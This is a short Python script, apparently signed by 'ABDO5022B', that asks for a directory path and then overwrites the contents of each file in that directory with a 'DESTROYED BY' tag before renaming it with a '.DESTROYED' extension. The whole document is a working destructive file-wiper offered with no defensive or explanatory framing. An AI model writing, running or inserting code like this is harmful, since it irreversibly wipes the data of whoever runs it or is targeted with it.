import os
def destroy_file(path):
	os.chdir(path)
	for i in os.listdir():
		r = open(i,'w')
		r.write("""DESTROYED BY
		####### ABDO5022B######""")
		r.close()
		os.rename(i,i+".DESTROYED")
t = input("path >>")
destroy_file(t)
